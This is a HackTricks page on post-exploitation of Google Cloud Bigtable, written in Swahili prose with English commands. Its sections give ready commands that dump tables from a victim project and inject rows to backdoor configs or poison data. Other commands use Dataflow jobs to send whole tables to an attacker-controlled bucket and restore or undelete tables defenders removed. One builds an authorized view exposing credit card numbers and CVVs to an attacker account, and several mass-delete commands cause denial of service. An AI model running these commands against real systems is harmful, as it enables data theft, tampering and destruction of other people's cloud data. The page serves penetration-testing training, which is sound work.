# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Kwa maelezo zaidi kuhusu Bigtable angalia:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Sakinisha CLI ya `cbt` mara moja kupitia Cloud SDK ili amri zilizo hapa chini zifanye kazi kwenye mashine yako:
>
> ```bash
> gcloud components install cbt
> ```

### Soma mistari

**Ruhusa:** `bigtable.tables.readRows`

`cbt` inakuja na Cloud SDK na inaweza kuwasiliana na admin/data APIs bila middleware yoyote. Elekeza `cbt` kwenye project/instance iliyovamiwa na tupa (dump) mistari moja kwa moja kutoka kwenye jedwali. Punguza skani ikiwa unahitaji tu kuangalia kwa haraka.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

#Â Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Andika safu

**Ruhusa:** `bigtable.tables.mutateRows`, (utahitaji `bigtable.tables.readRows` kuthibitisha mabadiliko).

Tumia zana hiyo hiyo kufanya upsert ya seli zozote. Hii ndiyo njia ya haraka zaidi ya backdoor configs, drop web shells, au plant poisoned dataset rows.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` inakubali raw bytes kupitia sintaksia ya `@/path`, hivyo unaweza kusukuma compiled payloads au serialized protobufs hasa jinsi services za downstream zinavyotarajia.

### Toa rows kwenye bucket yako

**Ruhusa:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Inawezekana exfiltrate yaliyomo ya jedwali lote hadi bucket inayodhibitiwa na mshambuliaji kwa kuanzisha job ya Dataflow ambayo inatiririsha rows ndani ya GCS bucket unayodhibiti.

> [!NOTE]
> Kumbuka kwamba utahitaji ruhusa `iam.serviceAccounts.actAs` juu ya SA fulani yenye ruhusa za kutosha kufanya export (kwa default, ikiwa haitatajwa vinginevyo, default compute SA itatumika).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Badilisha kiolezo kuwa `Cloud_Bigtable_to_GCS_Parquet` au `Cloud_Bigtable_to_GCS_SequenceFile` ikiwa unataka matokeo ya Parquet/SequenceFile badala ya JSON. Ruhusa ni zile zile; njia ya kiolezo tu ndio inabadilika.

### Kuingiza safu

**Ruhusa:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Inawezekana kuingiza yaliyomo ya jedwali zima kutoka kwenye bucket inayodhibitiwa na mshambulizi kwa kuanzisha job ya Dataflow inayotiririsha safu kwenye bucket ya GCS unayodhibiti. Kwa hili mshambulizi atalazimika kwanza kuunda faili ya parquet yenye data za kuingizwa na schema inayotarajiwa. Mshambulizi anaweza kwanza kusafirisha data kwa muundo wa parquet akifuata mbinu iliyotangulia na setting `Cloud_Bigtable_to_GCS_Parquet` na kisha kuongeza rekodi mpya kwenye faili ya parquet iliyopakuliwa



> [!NOTE]
> Kumbuka kwamba utahitaji ruhusa `iam.serviceAccounts.actAs` juu ya baadhi ya SA zenye ruhusa za kutosha kufanya export (kwa chaguo-msingi, ikiwa haijaonyeshwa vinginevyo, default compute SA itatumika).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Kurejesha chelezo

**Ruhusa:** `bigtable.backups.restore`, `bigtable.tables.create`.

Mshambuliaji mwenye ruhusa hizi anaweza kurejesha chelezo katika jedwali jipya chini ya udhibiti wake ili aweze kupata tena data nyeti za zamani.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Undelete tables

**Ruhusa:** `bigtable.tables.undelete`

Bigtable inasaidia ufutaji wa muda (soft-deletion) kwa kipindi cha huruma (kwa kawaida siku 7 kwa chaguo-msingi). Katika dirisha hili, mshambuliaji mwenye ruhusa ya `bigtable.tables.undelete` anaweza kurejesha jedwali lililofutwa hivi karibuni na kupata tena data zake zote, na huenda akafikia taarifa nyeti ambazo zilidhaniwa zimeharibiwa.

Hii ni muhimu hasa kwa:
- Kupata tena data kutoka kwa jedwali zilizofutwa na walinzi wakati wa incident response
- Kupata data ya kihistoria ambayo ilifutwa kwa makusudi
- Kurejesha ufutaji wa bahati mbaya au wa uharibifu ili kudumisha persistence
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> Operesheni ya undelete inafanya kazi tu ndani ya kipindi cha retention kilichowekwa (default 7 days). Baada dirisha hili la muda litakapomalizika, jedwali na data zake zitaondolewa kabisa na haiwezi kurejeshwa kupitia njia hii.


### Tengeneza Authorized Views

**Ruhusa:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views zinakuwezesha kuonyesha sehemu iliyochaguliwa ya jedwali. Badala ya kuzingatia least privilege, zitumie kuchapisha **hasa seti za safu/mstari zenye nyeti** unazozipenda na kuweka principal yako kwenye whitelist.

> [!WARNING]
> Tatizo ni kwamba ili kuunda authorized view pia unahitaji uwezo wa kusoma na kubadilisha mistari kwenye jedwali la msingi, kwa hivyo haupati ruhusa za ziada; kwa hiyo mbinu hii kwa kawaida haina matumizi.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Kwa sababu upatikanaji umewekwa wigo kwa view, watetezi mara nyingi hawazingatii kwamba umeunda endpoint mpya nyeti sana.

### Soma Authorized Views

**Ruhusa:** `bigtable.authorizedViews.readRows`

Ikiwa una upatikanaji wa Authorized View, unaweza kusoma data kutoka kwake kwa kutumia Bigtable client libraries kwa kubainisha jina la authorized view katika maombi yako ya kusoma. Kumbuka kwamba authorized view kwa kawaida itazuia kile unachoweza kufikia kutoka kwenye jedwali. Hapa chini kuna mfano kwa kutumia Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**Ruhusa:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Ruhusa zozote za Bigtable za kufuta zinaweza kutumiwa kama silaha kwa denial of service attacks. Mdukuzi mwenye ruhusa hizi anaweza kuvuruga shughuli kwa kufuta rasilimali muhimu za Bigtable:

- **`bigtable.appProfiles.delete`**: Futa profaili za programu, kuvunja muunganisho wa wateja na usanidi wa routing
- **`bigtable.authorizedViews.delete`**: Ondoa mitazamo iliyoruhusiwa, kukata njia halali za upatikanaji kwa programu
- **`bigtable.authorizedViews.deleteTagBinding`**: Ondoa binding za tag kutoka kwa mitazamo iliyoruhusiwa
- **`bigtable.backups.delete`**: Haribu snapshot za backup, kuondoa chaguzi za kurejesha baada ya maafa
- **`bigtable.clusters.delete`**: Futa klasta nzima, kusababisha kutokuwepo kwa data mara moja
- **`bigtable.instances.delete`**: Ondoa instances kamili za Bigtable, kufuta meza zote na usanidi
- **`bigtable.tables.delete`**: Futa meza binafsi, kusababisha hasara ya data na kushindwa kwa programu
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Operesheni za kufuta mara nyingi hufanyika mara moja na hazirudikiwi. Hakikisha kuna nakala za chelezo kabla ya kujaribu amri hizi, kwani zinaweza kusababisha upotevu wa data wa kudumu na usumbufu mkubwa wa huduma.

{{#include ../../../banners/hacktricks-training.md}}
